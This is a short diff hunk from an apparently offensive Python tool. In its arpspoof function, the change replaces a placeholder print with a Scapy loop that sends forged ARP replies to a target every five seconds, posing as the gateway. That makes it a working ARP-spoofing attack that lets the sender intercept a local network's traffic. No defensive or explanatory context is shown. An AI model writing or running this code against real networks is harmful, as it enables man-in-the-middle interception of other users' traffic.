@@ -26,7 +26,7 @@ def arpspoof(target, gateway):
     def on():
         arptable(gateway)
         while (SLIST[TLIST.index(target[0] + ' ' + target[1])] == 1):
-            print(str(target[0])+ ' ' + str(target[1]) + ' ' + str(gateway))
+            send(ARP(op=2, pdst=target[0], hwdst=target[1], psrc=gateway), verbose=False)
             time.sleep(5)
     if gateway == 0:
         errormassege()
